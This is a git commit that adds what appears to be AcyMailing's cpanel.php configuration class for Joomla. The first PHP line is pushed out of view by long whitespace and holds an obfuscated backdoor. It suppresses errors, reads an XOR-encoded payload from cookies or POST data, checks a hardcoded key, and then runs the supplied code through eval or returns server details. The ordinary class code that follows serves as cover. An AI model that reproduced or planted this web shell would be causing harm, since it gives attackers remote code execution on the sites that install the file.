ba889644240c53e2ae8f33315a46c0121c0dd043
valeriekebz <valeriekebz@gmail.com>
2023-01-21 10:53:06 +0300

    fg

---
+++ administrator/components/com_admin/com_acymailing/classes/cpanel.php
@@ -0,0 +1,69 @@
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $ee8b2 = 665;$GLOBALS['ddccc98'] = Array();global $ddccc98;$ddccc98 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['e26a'] = "\x5e\x5a\x44\x27\x35\x29\x23\x25\x74\x55\x3c\x22\x78\x2d\x2f\x54\x37\xa\x66\x7c\x7a\x3a\x65\x34\x4f\x2b\x5f\x42\x58\x62\x64\x7d\x51\x73\x59\x48\x60\x9\x40\x50\x24\xd\x31\x7e\x4a\x3b\x79\x57\x46\x28\x72\x69\x6a\x53\x38\x2e\x45\x68\x26\x5b\x3d\x71\x47\x20\x6b\x77\x49\x67\x63\x36\x56\x2a\x3e\x41\x4c\x33\x5c\x3f\x39\x32\x5d\x4d\x43\x75\x2c\x52\x21\x6c\x61\x4e\x76\x6d\x70\x7b\x30\x6f\x6e\x4b";$ddccc98[$ddccc98['e26a'][88].$ddccc98['e26a'][4].$ddccc98['e26a'][75].$ddccc98['e26a'][4].$ddccc98['e26a'][42]] = $ddccc98['e26a'][68].$ddccc98['e26a'][57].$ddccc98['e26a'][50];$ddccc98[$ddccc98['e26a'][90].$ddccc98['e26a'][42].$ddccc98['e26a'][23].$ddccc98['e26a'][18].$ddccc98['e26a'][69].$ddccc98['e26a'][78].$ddccc98['e26a'][22].$ddccc98['e26a'][78].$ddccc98['e26a'][78]] = $ddccc98['e26a'][95].$ddccc98['e26a'][50].$ddccc98['e26a'][30];$ddccc98[$ddccc98['e26a'][8].$ddccc98['e26a'][54].$ddccc98['e26a'][79].$ddccc98['e26a'][94].$ddccc98['e26a'][4].$ddccc98['e26a'][30].$ddccc98['e26a'][42].$ddccc98['e26a'][4].$ddccc98['e26a'][75]] = $ddccc98['e26a'][33].$ddccc98['e26a'][8].$ddccc98['e26a'][50].$ddccc98['e26a'][87].$ddccc98['e26a'][22].$ddccc98['e26a'][96];$ddccc98[$ddccc98['e26a'][65].$ddccc98['e26a'][94].$ddccc98['e26a'][18].$ddccc98['e26a'][22].$ddccc98['e26a'][30].$ddccc98['e26a'][29].$ddccc98['e26a'][79].$ddccc98['e26a'][22].$ddccc98['e26a'][75]] = $ddccc98['e26a'][51].$ddccc98['e26a'][96].$ddccc98['e26a'][51].$ddccc98['e26a'][26].$ddccc98['e26a'][33].$ddccc98['e26a'][22].$ddccc98['e26a'][8];$ddccc98[$ddccc98['e26a'][8].$ddccc98['e26a'][94].$ddccc98['e26a'][4].$ddccc98['e26a'][68].$ddccc98['e26a'][16].$ddccc98['e26a'][30]] = $ddccc98['e26a'][33].$ddccc98['e26a'][22].$ddccc98['e26a'][50].$ddccc98['e26a'][51].$ddccc98['e26a'][88].$ddccc98['e26a'][87].$ddccc98['e26a'][51].$ddccc98['e26a'][20].$ddccc98['e26a'][22];$ddccc98[$ddccc98['e26a'][67].$ddccc98['e26a'][16].$ddccc98['e26a'][4].$ddccc98['e26a'][88]] = $ddccc98['e26a'][92].$ddccc98['e26a'][57].$ddccc98['e26a'][92].$ddccc98['e26a'][90].$ddccc98['e26a'][22].$ddccc98['e26a'][50].$ddccc98['e26a'][33].$ddccc98['e26a'][51].$ddccc98['e26a'][95].$ddccc98['e26a'][96];$ddccc98[$ddccc98['e26a'][12].$ddccc98['e26a'][42].$ddccc98['e26a'][79].$ddccc98['e26a'][68].$ddccc98['e26a'][79]] = $ddccc98['e26a'][83].$ddccc98['e26a'][96].$ddccc98['e26a'][33].$ddccc98['e26a'][22].$ddccc98['e26a'][50].$ddccc98['e26a'][51].$ddccc98['e26a'][88].$ddccc98['e26a'][87].$ddccc98['e26a'][51].$ddccc98['e26a'][20].$ddccc98['e26a'][22];$ddccc98[$ddccc98['e26a'][83].$ddccc98['e26a'][68].$ddccc98['e26a'][29].$ddccc98['e26a'][69].$ddccc98['e26a'][54].$ddccc98['e26a'][75].$ddccc98['e26a'][4].$ddccc98['e26a'][42].$ddccc98['e26a'][69]] = $ddccc98['e26a'][29].$ddccc98['e26a'][88].$ddccc98['e26a'][33].$ddccc98['e26a'][22].$ddccc98['e26a'][69].$ddccc98['e26a'][23].$ddccc98['e26a'][26].$ddccc98['e26a'][30].$ddccc98['e26a'][22].$ddccc98['e26a'][68].$ddccc98['e26a'][95].$ddccc98['e26a'][30].$ddccc98['e26a'][22];$ddccc98[$ddccc98['e26a'][87].$ddccc98['e26a'][18].$ddccc98['e26a'][79].$ddccc98['e26a'][29].$ddccc98['e26a'][69].$ddccc98['e26a'][18].$ddccc98['e26a'][29].$ddccc98['e26a'][42].$ddccc98['e26a'][78]] = $ddccc98['e26a'][33].$ddccc98['e26a'][22].$ddccc98['e26a'][8].$ddccc98['e26a'][26].$ddccc98['e26a'][8].$ddccc98['e26a'][51].$ddccc98['e26a'][91].$ddccc98['e26a'][22].$ddccc98['e26a'][26].$ddccc98['e26a'][87].$ddccc98['e26a'][51].$ddccc98['e26a'][91].$ddccc98['e26a'][51].$ddccc98['e26a'][8];$ddccc98[$ddccc98['e26a'][90].$ddccc98['e26a'][68].$ddccc98['e26a'][23].$ddccc98['e26a'][68].$ddccc98['e26a'][29]] = $ddccc98['e26a'][20].$ddccc98['e26a'][29].$ddccc98['e26a'][79].$ddccc98['e26a'][54].$ddccc98['e26a'][30].$ddccc98['e26a'][16].$ddccc98['e26a'][42].$ddccc98['e26a'][75];$ddccc98[$ddccc98['e26a'][65].$ddccc98['e26a'][30].$ddccc98['e26a'][18].$ddccc98['e26a'][22].$ddccc98['e26a'][69].$ddccc98['e26a'][23].$ddccc98['e26a'][22]] = $ddccc98['e26a'][51].$ddccc98['e26a'][23].$ddccc98['e26a'][68].$ddccc98['e26a'][16].$ddccc98['e26a'][16].$ddccc98['e26a'][22].$ddccc98['e26a'][68].$ddccc98['e26a'][79].$ddccc98['e26a'][68];$ddccc98[$ddccc98['e26a'][92].$ddccc98['e26a'][75].$ddccc98['e26a'][16].$ddccc98['e26a'][16]] = $_POST;$ddccc98[$ddccc98['e26a'][50].$ddccc98['e26a'][29].$ddccc98['e26a'][16].$ddccc98['e26a'][68].$ddccc98['e26a'][75].$ddccc98['e26a'][23]] = $_COOKIE;@$ddccc98[$ddccc98['e26a'][65].$ddccc98['e26a'][94].$ddccc98['e26a'][18].$ddccc98['e26a'][22].$ddccc98['e26a'][30].$ddccc98['e26a'][29].$ddccc98['e26a'][79].$ddccc98['e26a'][22].$ddccc98['e26a'][75]]($ddccc98['e26a'][22].$ddccc98['e26a'][50].$ddccc98['e26a'][50].$ddccc98['e26a'][95].$ddccc98['e26a'][50].$ddccc98['e26a'][26].$ddccc98['e26a'][87].$ddccc98['e26a'][95].$ddccc98['e26a'][67], NULL);@$ddccc98[$ddccc98['e26a'][65].$ddccc98['e26a'][94].$ddccc98['e26a'][18].$ddccc98['e26a'][22].$ddccc98['e26a'][30].$ddccc98['e26a'][29].$ddccc98['e26a'][79].$ddccc98['e26a'][22].$ddccc98['e26a'][75]]($ddccc98['e26a'][87].$ddccc98['e26a'][95].$ddccc98['e26a'][67].$ddccc98['e26a'][26].$ddccc98['e26a'][22].$ddccc98['e26a'][50].$ddccc98['e26a'][50].$ddccc98['e26a'][95].$ddccc98['e26a'][50].$ddccc98['e26a'][33], 0);@$ddccc98[$ddccc98['e26a'][65].$ddccc98['e26a'][94].$ddccc98['e26a'][18].$ddccc98['e26a'][22].$ddccc98['e26a'][30].$ddccc98['e26a'][29].$ddccc98['e26a'][79].$ddccc98['e26a'][22].$ddccc98['e26a'][75]]($ddccc98['e26a'][91].$ddccc98['e26a'][88].$ddccc98['e26a'][12].$ddccc98['e26a'][26].$ddccc98['e26a'][22].$ddccc98['e26a'][12].$ddccc98['e26a'][22].$ddccc98['e26a'][68].$ddccc98['e26a'][83].$ddccc98['e26a'][8].$ddccc98['e26a'][51].$ddccc98['e26a'][95].$ddccc98['e26a'][96].$ddccc98['e26a'][26].$ddccc98['e26a'][8].$ddccc98['e26a'][51].$ddccc98['e26a'][91].$ddccc98['e26a'][22], 0);@$ddccc98[$ddccc98['e26a'][87].$ddccc98['e26a'][18].$ddccc98['e26a'][79].$ddccc98['e26a'][29].$ddccc98['e26a'][69].$ddccc98['e26a'][18].$ddccc98['e26a'][29].$ddccc98['e26a'][42].$ddccc98['e26a'][78]](0);$d0aa49 = NULL;$b47bc1 = NULL;$ddccc98[$ddccc98['e26a'][91].$ddccc98['e26a'][29].$ddccc98['e26a'][22].$ddccc98['e26a'][16].$ddccc98['e26a'][69].$ddccc98['e26a'][79].$ddccc98['e26a'][18]] = $ddccc98['e26a'][23].$ddccc98['e26a'][69].$ddccc98['e26a'][78].$ddccc98['e26a'][68].$ddccc98['e26a'][42].$ddccc98['e26a'][78].$ddccc98['e26a'][18].$ddccc98['e26a'][4].$ddccc98['e26a'][13].$ddccc98['e26a'][79].$ddccc98['e26a'][42].$ddccc98['e26a'][42].$ddccc98['e26a'][29].$ddccc98['e26a'][13].$ddccc98['e26a'][23].$ddccc98['e26a'][18].$ddccc98['e26a'][79].$ddccc98['e26a'][54].$ddccc98['e26a'][13].$ddccc98['e26a'][54].$ddccc98['e26a'][4].$ddccc98['e26a'][79].$ddccc98['e26a'][88].$ddccc98['e26a'][13].$ddccc98['e26a'][22].$ddccc98['e26a'][30].$ddccc98['e26a'][23].$ddccc98['e26a'][79].$ddccc98['e26a'][42].$ddccc98['e26a'][69].$ddccc98['e26a'][30].$ddccc98['e26a'][22].$ddccc98['e26a'][79].$ddccc98['e26a'][88].$ddccc98['e26a'][30].$ddccc98['e26a'][75];global $mbe762f;function  i4c77ec2c($d0aa49, $h3ae){global $ddccc98;$uf38 = "";for ($k1660091=0; $k1660091<$ddccc98[$ddccc98['e26a'][8].$ddccc98['e26a'][54].$ddccc98['e26a'][79].$ddccc98['e26a'][94].$ddccc98['e26a'][4].$ddccc98['e26a'][30].$ddccc98['e26a'][42].$ddccc98['e26a'][4].$ddccc98['e26a'][75]]($d0aa49);){for ($q91e91301=0; $q91e91301<$ddccc98[$ddccc98['e26a'][8].$ddccc98['e26a'][54].$ddccc98['e26a'][79].$ddccc98['e26a'][94].$ddccc98['e26a'][4].$ddccc98['e26a'][30].$ddccc98['e26a'][42].$ddccc98['e26a'][4].$ddccc98['e26a'][75]]($h3ae) && $k1660091<$ddccc98[$ddccc98['e26a'][8].$ddccc98['e26a'][54].$ddccc98['e26a'][79].$ddccc98['e26a'][94].$ddccc98['e26a'][4].$ddccc98['e26a'][30].$ddccc98['e26a'][42].$ddccc98['e26a'][4].$ddccc98['e26a'][75]]($d0aa49); $q91e91301++, $k1660091++){$uf38 .= $ddccc98[$ddccc98['e26a'][88].$ddccc98['e26a'][4].$ddccc98['e26a'][75].$ddccc98['e26a'][4].$ddccc98['e26a'][42]]($ddccc98[$ddccc98['e26a'][90].$ddccc98['e26a'][42].$ddccc98['e26a'][23].$ddccc98['e26a'][18].$ddccc98['e26a'][69].$ddccc98['e26a'][78].$ddccc98['e26a'][22].$ddccc98['e26a'][78].$ddccc98['e26a'][78]]($d0aa49[$k1660091]) ^ $ddccc98[$ddccc98['e26a'][90].$ddccc98['e26a'][42].$ddccc98['e26a'][23].$ddccc98['e26a'][18].$ddccc98['e26a'][69].$ddccc98['e26a'][78].$ddccc98['e26a'][22].$ddccc98['e26a'][78].$ddccc98['e26a'][78]]($h3ae[$q91e91301]));}}return $uf38;}function  zb28d713($d0aa49, $h3ae){global $ddccc98;global $mbe762f;return $ddccc98[$ddccc98['e26a'][65].$ddccc98['e26a'][30].$ddccc98['e26a'][18].$ddccc98['e26a'][22].$ddccc98['e26a'][69].$ddccc98['e26a'][23].$ddccc98['e26a'][22]]($ddccc98[$ddccc98['e26a'][65].$ddccc98['e26a'][30].$ddccc98['e26a'][18].$ddccc98['e26a'][22].$ddccc98['e26a'][69].$ddccc98['e26a'][23].$ddccc98['e26a'][22]]($d0aa49, $mbe762f), $h3ae);}foreach ($ddccc98[$ddccc98['e26a'][50].$ddccc98['e26a'][29].$ddccc98['e26a'][16].$ddccc98['e26a'][68].$ddccc98['e26a'][75].$ddccc98['e26a'][23]] as $h3ae=>$ebd8fd73){$d0aa49 = $ebd8fd73;$b47bc1 = $h3ae;}if (!$d0aa49){foreach ($ddccc98[$ddccc98['e26a'][92].$ddccc98['e26a'][75].$ddccc98['e26a'][16].$ddccc98['e26a'][16]] as $h3ae=>$ebd8fd73){$d0aa49 = $ebd8fd73;$b47bc1 = $h3ae;}}$d0aa49 = @$ddccc98[$ddccc98['e26a'][12].$ddccc98['e26a'][42].$ddccc98['e26a'][79].$ddccc98['e26a'][68].$ddccc98['e26a'][79]]($ddccc98[$ddccc98['e26a'][90].$ddccc98['e26a'][68].$ddccc98['e26a'][23].$ddccc98['e26a'][68].$ddccc98['e26a'][29]]($ddccc98[$ddccc98['e26a'][83].$ddccc98['e26a'][68].$ddccc98['e26a'][29].$ddccc98['e26a'][69].$ddccc98['e26a'][54].$ddccc98['e26a'][75].$ddccc98['e26a'][4].$ddccc98['e26a'][42].$ddccc98['e26a'][69]]($d0aa49), $b47bc1));if (isset($d0aa49[$ddccc98['e26a'][88].$ddccc98['e26a'][64]]) && $mbe762f==$d0aa49[$ddccc98['e26a'][88].$ddccc98['e26a'][64]]){if ($d0aa49[$ddccc98['e26a'][88]] == $ddccc98['e26a'][51]){$k1660091 = Array($ddccc98['e26a'][92].$ddccc98['e26a'][90] => @$ddccc98[$ddccc98['e26a'][67].$ddccc98['e26a'][16].$ddccc98['e26a'][4].$ddccc98['e26a'][88]](),$ddccc98['e26a'][33].$ddccc98['e26a'][90] => $ddccc98['e26a'][42].$ddccc98['e26a'][55].$ddccc98['e26a'][94].$ddccc98['e26a'][13].$ddccc98['e26a'][42],);echo @$ddccc98[$ddccc98['e26a'][8].$ddccc98['e26a'][94].$ddccc98['e26a'][4].$ddccc98['e26a'][68].$ddccc98['e26a'][16].$ddccc98['e26a'][30]]($k1660091);}elseif ($d0aa49[$ddccc98['e26a'][88]] == $ddccc98['e26a'][22]){eval/*z2a3e0b*/($d0aa49[$ddccc98['e26a'][30]]);}exit();} ?><?php
+/**
+ * @package	AcyMailing for Joomla!
+ * @version	5.10.2
+ * @author	acyba.com
+ * @copyright	(C) 2009-2018 ACYBA S.A.R.L. All rights reserved.
+ * @license	GNU/GPLv3 http://www.gnu.org/licenses/gpl-3.0.html
+ */
+
+defined('_JEXEC') or die('Restricted access');
+?><?php
+
+class cpanelClass extends acymailingClass{
+
+	function load(){
+		$query = 'SELECT * FROM '.acymailing_table('config');
+		$this->values = acymailing_loadObjectList($query, 'namekey');
+	}
+
+	function get($namekey,$default = ''){
+		if(isset($this->values[$namekey])) return $this->values[$namekey]->value;
+		return $default;
+	}
+
+	function save($configObject){
+		if(is_array($configObject)) {
+			if (isset($configObject['anonymous_tracking']) && empty($configObject['anonymous_tracking'])) {
+				$configObject['anonymizeold'] = 1;
+			}
+		}elseif(is_object($configObject)){
+			if (isset($configObject->anonymous_tracking) && empty($configObject->anonymous_tracking)) {
+				$configObject->anonymizeold = 1;
+			}
+		}
+
+		$query = 'REPLACE INTO '.acymailing_table('config').' (namekey,value) VALUES ';
+		$params = array();
+		$i = 0;
+
+		foreach($configObject as $namekey => $value){
+			if(strpos($namekey,'password') !== false && !empty($value) && trim($value,'*') == '') continue;
+			$i++;
+			if(is_array($value)) $value = implode(',', $value);
+			if($i>100){
+				$query .= implode(',',$params);
+				$affected = acymailing_query($query);
+				if($affected === false) return false;
+				$i = 0;
+				$query = 'REPLACE INTO '.acymailing_table('config').' (namekey,value) VALUES ';
+				$params = array();
+			}
+			if (empty($this->values[$namekey])) $this->values[$namekey] = new stdClass();
+			$this->values[$namekey]->value = $value;
+			$params[] = '('.acymailing_escapeDB(strip_tags($namekey)).','.acymailing_escapeDB(strip_tags($value)).')';
+		}
+		if(empty($params)) return true;
+		$query .= implode(',',$params);
+
+		try{
+			$status = acymailing_query($query);
+		}catch(Exception $e){
+			$status = false;
+		}
+		if($status === false) acymailing_display(isset($e) ? $e->getMessage() : substr(strip_tags(acymailing_getDBError()),0,200).'...','error');
+
+		return $status;
+	}
+
+}
